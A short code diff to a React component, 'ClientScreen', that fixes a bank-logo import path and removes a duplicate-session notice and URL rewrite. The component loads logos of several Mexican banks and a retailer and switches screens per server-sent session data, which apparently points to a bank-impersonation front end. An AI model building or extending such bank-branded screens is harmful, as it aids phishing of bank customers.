@@ -6,7 +6,7 @@ import { Session, ScreenType } from '@shared/schema';
 import { formatDate } from '@/utils/helpers';
 import liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool
 import liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco
-import citibanamexLogo from '@assets/Banamex.png';
+import citibanamexLogo from '../assets/Banamex.png';
 import banbajioLogo from '../assets/banbajio_logo_oficial.png';
 import banbajioBackground from '../assets/IMG_0354.jpeg';
 import bbvaLogo from '@assets/bbva_logo.png';
@@ -110,14 +110,6 @@ export default function ClientScreen() {
             console.log('Banco recibido:', message.data.banco);
             message.data.banco = message.data.banco.toUpperCase();
             console.log('Banco normalizado:', message.data.banco);
-          }
-          
-          // Si es una nueva sesión por acceso múltiple, mostrar notificación
-          if (message.isNewSession && message.originalSessionId) {
-            console.log(`Nueva sesión creada por acceso múltiple. Original: ${message.originalSessionId}, Nueva: ${message.data.sessionId}`);
-            setInitialMessage(`Nueva sesión generada: ${message.data.sessionId}`);
-            // Actualizar la URL del navegador para reflejar la nueva sesión
-            window.history.replaceState({}, '', `/${message.data.sessionId}`);
           }
           
           setSessionData(message.data);
